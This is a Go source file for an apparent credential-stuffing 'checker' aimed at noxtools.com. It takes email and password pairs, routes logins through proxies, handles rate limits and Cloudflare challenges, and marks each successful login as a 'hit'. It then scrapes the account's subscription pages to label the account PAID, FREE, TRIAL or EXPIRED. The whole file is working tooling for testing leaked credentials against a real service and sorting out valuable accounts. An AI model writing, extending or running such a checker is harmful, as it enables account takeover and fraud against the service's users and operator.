package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

var (
	noxLoginAttemptIDRE  = regexp.MustCompile(`(?i)name=["']login_attempt_id["'][^>]*value=["']([^"']+)["']`)
	noxLoginAttemptIDRE2 = regexp.MustCompile(`(?i)value=["']([0-9]{8,})["'][^>]*name=["']login_attempt_id["']`)
	noxAMErrorsRE        = regexp.MustCompile(`(?is)class=["']am-errors["'][^>]*>(.*?)</`)
	noxSubscriptionItemRE = regexp.MustCompile(`(?is)<div[^>]*class=["'][^"']*subscription-item[^"']*["'][^>]*>(.*?)</div>`)
	noxStrongStatusRE    = regexp.MustCompile(`(?is)<strong[^>]*>(.*?)</strong>\s*<span[^>]*class=["'][^"']*(text-success|text-warning|text-danger|text-muted)[^"']*["'][^>]*>([^<]{2,60})</span>`)
	noxExpiresInPlanRE   = regexp.MustCompile(`(?is)<strong[^>]*>(.*?)</strong>[\s\S]{0,600}?<span[^>]*>[\s\S]*?(expires\s+in\s+\d+\s+days?)[\s\S]*?</span>`)
	noxStatusSpanRE      = regexp.MustCompile(`(?is)<span[^>]*class=["'][^"']*(?:statuspill|text-success|text-warning|text-danger|text-muted)[^"']*["'][^>]*>([^<]{2,60})</span>`)
	noxActiveInvoiceRE   = regexp.MustCompile(`(?is)<div[^>]*class=["'][^"']*am-active-invoice["'][^>]*>(.*?)</div>\s*</div>\s*</div>`)
	noxProductNameRE     = regexp.MustCompile(`(?is)class=["'][^"']*product-name[^"']*["'][^>]*>([^<]{2,100})<`)
	noxPaymentRowRE      = regexp.MustCompile(`(?is)<tr[^>]*>(.*?)</tr>`)
	noxPaymentCellRE     = regexp.MustCompile(`(?is)<td[^>]*>(.*?)</td>`)
	noxExpiresInDaysRE   = regexp.MustCompile(`(?i)expires\s+in\s+(\d+)\s+days?`)
	noxDaysLeftRE        = regexp.MustCompile(`(?i)(\d+)\s+days?\s+left`)
)

type noxtoolsPlanInfo struct {
	Active   []string
	Expired  []string
	LastPaid string
	NoActive bool
}

func (c *Checker) checkNoxtools(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	defer clearHTTPClientSession(client, c.cfg.BaseURL(), "https://noxtools.com")

	loginURL := c.cfg.LoginURL()
	referer := c.cfg.Var("login_referer", c.cfg.BaseURL()+"/")

	loginBody, loginStatus, err := c.fetchURL(client, loginURL, map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
	})
	if err != nil {
		status, reason := c.resultFromRequestErr("login page", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if loginStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login page HTTP 429")
		return result
	}
	if loginStatus != http.StatusOK {
		result.Status = StatusError
		result.Reason = fmt.Sprintf("login page HTTP %d", loginStatus)
		return result
	}
	if noxtoolsIsCloudflareChallenge(loginBody) {
		result.Status = StatusError
		result.Reason = "Cloudflare challenge on login page — try proxy or wait"
		return result
	}

	attemptID, err := parseNoxtoolsLoginAttemptID(loginBody)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}

	finalURL, postBody, postStatus, err := c.postNoxtoolsLogin(client, loginURL, email, password, attemptID, referer)
	if err != nil {
		status, reason := c.resultFromRequestErr("login POST", err)
		result.Status = status
		result.Reason = reason
		return result
	}
	if postStatus == http.StatusTooManyRequests {
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason("login POST HTTP 429")
		return result
	}

	if msg := parseNoxtoolsLoginError(postBody); msg != "" {
		lower := strings.ToLower(msg)
		if strings.Contains(lower, "wait") || strings.Contains(lower, "try again later") || strings.Contains(lower, "too many") {
			result.Status = StatusRateLimited
			result.Reason = msg
			return result
		}
		result.Status = StatusFail
		result.Reason = msg
		return result
	}

	if !noxtoolsLoginSucceeded(finalURL, postBody) {
		result.Status = StatusFail
		result.Reason = "login failed — still on sign-in page"
		return result
	}

	result.AccountEmail = email
	planInfo := c.fetchNoxtoolsPlanInfo(client)
	result.PlanName, result.PlanLabel = formatNoxtoolsPlanResult(planInfo)
	result.Status = StatusHit
	return result
}

func parseNoxtoolsLoginAttemptID(html string) (string, error) {
	for _, re := range []*regexp.Regexp{noxLoginAttemptIDRE, noxLoginAttemptIDRE2} {
		if m := re.FindStringSubmatch(html); len(m) > 1 && strings.TrimSpace(m[1]) != "" {
			return strings.TrimSpace(m[1]), nil
		}
	}
	return "", fmt.Errorf("login_attempt_id not found — fetch fresh GET %s before POST", "/secure/login")
}

func (c *Checker) postNoxtoolsLogin(client *http.Client, loginURL, email, password, attemptID, referer string) (finalURL, body string, status int, err error) {
	form := url.Values{}
	form.Set("amember_login", email)
	form.Set("amember_pass", password)
	form.Set("login_attempt_id", attemptID)
	form.Set("_referer", referer)

	req, err := http.NewRequest(http.MethodPost, loginURL, strings.NewReader(form.Encode()))
	if err != nil {
		return "", "", 0, err
	}
	req.Header.Set("User-Agent", c.cfg.UserAgent)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Cache-Control", "no-cache, no-store")
	req.Header.Set("Pragma", "no-cache")
	req.Header.Set("Origin", c.cfg.BaseURL())
	req.Header.Set("Referer", loginURL)

	resp, err := client.Do(req)
	if err != nil {
		return "", "", 0, err
	}
	defer resp.Body.Close()

	data, err := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	if err != nil {
		return resp.Request.URL.String(), "", resp.StatusCode, err
	}
	return resp.Request.URL.String(), string(data), resp.StatusCode, nil
}

func parseNoxtoolsLoginError(body string) string {
	m := noxAMErrorsRE.FindStringSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	text := regexp.MustCompile(`<[^>]+>`).ReplaceAllString(m[1], " ")
	text = strings.Join(strings.Fields(text), " ")
	return strings.TrimSpace(text)
}

func noxtoolsLoginSucceeded(finalURL, body string) bool {
	if parseNoxtoolsLoginError(body) != "" {
		return false
	}
	lower := strings.ToLower(body)
	if strings.Contains(lower, `name="amember_login"`) && strings.Contains(lower, "sign in") {
		u, err := url.Parse(finalURL)
		if err != nil || strings.HasSuffix(strings.ToLower(u.Path), "/secure/login") {
			return false
		}
	}
	u, err := url.Parse(finalURL)
	if err == nil {
		path := strings.ToLower(u.Path)
		if strings.Contains(path, "/secure/secure/") {
			return true
		}
		if strings.Contains(path, "/secure/member") && !strings.Contains(path, "/secure/login") {
			return true
		}
	}
	return !strings.Contains(lower, `name="amember_login"`)
}

func noxtoolsIsCloudflareChallenge(body string) bool {
	lower := strings.ToLower(body)
	return strings.Contains(lower, "cdn-cgi/challenge-platform") &&
		(strings.Contains(lower, "just a moment") || strings.Contains(lower, "cf-browser-verification"))
}

func (c *Checker) fetchNoxtoolsPlanInfo(client *http.Client) noxtoolsPlanInfo {
	info := noxtoolsPlanInfo{}
	memberURL := c.cfg.Var("member_url", c.cfg.BaseURL()+"/secure/member")
	memberBody, status, _, err := c.doRequest(client, "GET", memberURL, c.noxtoolsPageHeaders(c.cfg.BaseURL()+"/"), "")
	if err == nil && status == http.StatusOK && !strings.Contains(strings.ToLower(memberBody), `name="amember_login"`) {
		info = parseNoxtoolsMemberPlans(noxtoolsVisibleHTML(memberBody))
	}
	if len(info.Active) == 0 {
		payURL := c.cfg.Var("payment_history_url", c.cfg.BaseURL()+"/secure/member/payment-history")
		payBody, payStatus, _, payErr := c.doRequest(client, "GET", payURL, c.noxtoolsPageHeaders(memberURL), "")
		if payErr == nil && payStatus == http.StatusOK {
			payHTML := noxtoolsVisibleHTML(payBody)
			payInfo := parseNoxtoolsMemberPlans(payHTML)
			if len(payInfo.Active) > 0 {
				info.Active = payInfo.Active
				info.NoActive = false
			}
			if len(payInfo.Expired) > 0 && len(info.Expired) == 0 {
				info.Expired = payInfo.Expired
			}
			if payInfo.LastPaid != "" && info.LastPaid == "" && info.NoActive {
				info.LastPaid = payInfo.LastPaid
			}
		}
	}
	return info
}

func (c *Checker) noxtoolsPageHeaders(referer string) map[string]string {
	return map[string]string{
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.9",
		"Cache-Control":   "no-cache, no-store",
		"Pragma":          "no-cache",
		"User-Agent":      c.cfg.UserAgent,
		"Referer":         referer,
	}
}

func noxtoolsVisibleHTML(body string) string {
	body = regexp.MustCompile(`(?is)<style.*?</style>`).ReplaceAllString(body, "")
	body = regexp.MustCompile(`(?is)<script.*?</script>`).ReplaceAllString(body, "")
	return body
}

func parseNoxtoolsMemberPlans(body string) noxtoolsPlanInfo {
	info := noxtoolsPlanInfo{}
	lower := strings.ToLower(body)

	if strings.Contains(body, `id="no_subscription"`) ||
		strings.Contains(lower, "you have no active subscriptions") ||
		strings.Contains(lower, "you have no active subscription") {
		info.NoActive = true
	}

	subBlock := extractNoxtoolsBlock(body, `id=["']member-main-subscriptions["']`, `cancel-subscription-popup`)
	activeBlock := extractNoxtoolsBlock(body, `id=["']am-block-active-subscriptions["']`, `id=["']am-block-payments["']`)
	parseBlocks := []string{subBlock, activeBlock, body}

	addUnique := func(list *[]string, val string) {
		val = strings.TrimSpace(val)
		if val == "" || isNoxtoolsNoisePlan(val) {
			return
		}
		for _, existing := range *list {
			if strings.EqualFold(existing, val) || strings.EqualFold(noxtoolsPlanBaseName(existing), noxtoolsPlanBaseName(val)) {
				return
			}
		}
		*list = append(*list, val)
	}

	addActive := func(name, status string) {
		name = noxtoolsStripHTML(name)
		if name == "" {
			return
		}
		days, active, expired := parseNoxtoolsExpiryStatus(status)
		switch {
		case active:
			addUnique(&info.Active, formatNoxtoolsActivePlan(name, days))
		case expired:
			addUnique(&info.Expired, name)
		}
	}

	for _, block := range parseBlocks {
		for _, m := range noxSubscriptionItemRE.FindAllStringSubmatch(block, -1) {
			name, status := parseNoxtoolsSubscriptionItem(m[1])
			if status == "" {
				for _, sm := range noxStatusSpanRE.FindAllStringSubmatch(m[1], -1) {
					status = sm[1]
					break
				}
			}
			addActive(name, status)
		}

		for _, m := range noxExpiresInPlanRE.FindAllStringSubmatch(block, -1) {
			name := noxtoolsStripHTML(m[1])
			status := strings.TrimSpace(m[2])
			addActive(name, status)
		}

		for _, m := range noxStrongStatusRE.FindAllStringSubmatch(block, -1) {
			addActive(m[1], m[3])
		}

		for _, m := range noxActiveInvoiceRE.FindAllStringSubmatch(block, -1) {
			invoice := m[1]
			if prod, ok := extractNoxtoolsProductName(invoice); ok {
				status := ""
				for _, sm := range noxStatusSpanRE.FindAllStringSubmatch(invoice, -1) {
					status = sm[1]
					break
				}
				if status == "" {
					for _, sm := range noxExpiresInDaysRE.FindAllStringSubmatch(invoice, -1) {
						status = sm[0]
						break
					}
				}
				addActive(prod, status)
			}
		}

		for _, m := range noxProductNameRE.FindAllStringSubmatch(block, -1) {
			addActive(m[1], "active")
		}
	}

	if info.NoActive {
		info.LastPaid = parseNoxtoolsLastPaidProduct(body)
	}
	if len(info.Active) > 0 {
		info.NoActive = false
	}
	return info
}

func noxtoolsStripHTML(s string) string {
	s = regexp.MustCompile(`<[^>]+>`).ReplaceAllString(s, " ")
	return strings.Join(strings.Fields(s), " ")
}

func noxtoolsPlanBaseName(plan string) string {
	if idx := strings.LastIndex(plan, " ("); idx > 0 && strings.HasSuffix(plan, " left)") {
		return plan[:idx]
	}
	if strings.HasPrefix(strings.ToLower(plan), "expired: ") {
		return strings.TrimSpace(plan[9:])
	}
	return plan
}

func parseNoxtoolsExpiryStatus(status string) (daysLeft int, active bool, expired bool) {
	st := strings.ToLower(strings.TrimSpace(status))
	if st == "" {
		return -1, true, false
	}
	if m := noxExpiresInDaysRE.FindStringSubmatch(st); len(m) > 1 {
		d, _ := strconv.Atoi(m[1])
		return d, true, false
	}
	if m := noxDaysLeftRE.FindStringSubmatch(st); len(m) > 1 {
		d, _ := strconv.Atoi(m[1])
		return d, true, false
	}
	if strings.Contains(st, "recurring") || strings.Contains(st, "active") {
		return -1, true, false
	}
	if strings.HasPrefix(st, "expired") || strings.Contains(st, "cancelled") || st == "canceled" {
		return 0, false, true
	}
	return -1, true, false
}

func formatNoxtoolsActivePlan(name string, daysLeft int) string {
	name = strings.TrimSpace(name)
	if daysLeft > 0 {
		return fmt.Sprintf("%s (%d days left)", name, daysLeft)
	}
	return name
}

func extractNoxtoolsBlock(body, startMarker, endMarker string) string {
	startRE := regexp.MustCompile(`(?is)` + startMarker + `[^>]*>`)
	endRE := regexp.MustCompile(`(?is)` + endMarker)
	start := startRE.FindStringIndex(body)
	if start == nil {
		return body
	}
	chunk := body[start[1]:]
	end := endRE.FindStringIndex(chunk)
	if end == nil {
		return chunk
	}
	return chunk[:end[0]]
}

func parseNoxtoolsSubscriptionItem(item string) (name, status string) {
	if m := regexp.MustCompile(`(?is)<strong[^>]*>(.*?)</strong>`).FindStringSubmatch(item); len(m) > 1 {
		name = noxtoolsStripHTML(m[1])
	}
	if m := regexp.MustCompile(`(?is)<span[^>]*class=["'][^"']*text-(success|danger|warning|muted)[^"']*["'][^>]*>([^<]{2,60})</span>`).FindStringSubmatch(item); len(m) > 2 {
		status = strings.TrimSpace(m[2])
	}
	return name, status
}

func extractNoxtoolsProductName(block string) (string, bool) {
	for _, re := range []*regexp.Regexp{
		noxProductNameRE,
		regexp.MustCompile(`(?is)<h[1-4][^>]*>([^<]{2,100})</h`),
		regexp.MustCompile(`(?is)<strong[^>]*>([^<]{2,100})</strong>`),
	} {
		if m := re.FindStringSubmatch(block); len(m) > 1 {
			name := strings.TrimSpace(m[1])
			if name != "" && !isNoxtoolsNoisePlan(name) {
				return name, true
			}
		}
	}
	return "", false
}

func parseNoxtoolsLastPaidProduct(body string) string {
	for _, m := range noxPaymentRowRE.FindAllStringSubmatch(body, -1) {
		var cells []string
		for _, td := range noxPaymentCellRE.FindAllStringSubmatch(m[1], 8) {
			text := strings.TrimSpace(regexp.MustCompile(`<[^>]+>`).ReplaceAllString(td[1], ""))
			if text != "" {
				cells = append(cells, text)
			}
		}
		if len(cells) < 3 {
			continue
		}
		product := cells[2]
		if isNoxtoolsNoisePlan(product) || strings.Contains(strings.ToLower(product), "invoice") {
			continue
		}
		return product
	}
	return ""
}

func isNoxtoolsNoisePlan(name string) bool {
	lower := strings.ToLower(strings.TrimSpace(name))
	noise := []string{
		"active subscriptions", "payment history", "useful links", "logout",
		"change password", "add/renew subscription", "cancel subscription",
		"payments history", "n/a", "product", "package",
	}
	for _, n := range noise {
		if lower == n || strings.HasPrefix(lower, n) {
			return true
		}
	}
	return false
}

func formatNoxtoolsPlanResult(info noxtoolsPlanInfo) (planName, planLabel string) {
	if len(info.Active) > 0 {
		return strings.Join(info.Active, " | "), classifyNoxtoolsPlan(strings.Join(info.Active, " "))
	}
	if info.NoActive {
		return "No Active Subscription", "FREE"
	}
	if len(info.Expired) > 0 {
		parts := make([]string, len(info.Expired))
		for i, name := range info.Expired {
			parts[i] = name + " (expired)"
		}
		return strings.Join(parts, " | "), "EXPIRED"
	}
	if info.LastPaid != "" {
		return info.LastPaid + " (expired)", "EXPIRED"
	}
	return "Logged In", "UNKNOWN"
}

func classifyNoxtoolsPlan(planName string) string {
	lower := strings.ToLower(strings.TrimSpace(planName))
	switch {
	case lower == "" || lower == "logged in":
		return "UNKNOWN"
	case strings.HasPrefix(lower, "expired:") || strings.HasPrefix(lower, "last paid:"):
		return "EXPIRED"
	case strings.Contains(lower, "no active"):
		return "FREE"
	case strings.Contains(lower, "trial"):
		return "FREE_TRIAL"
	case strings.Contains(lower, "free"):
		return "FREE"
	default:
		return "PAID"
	}
}

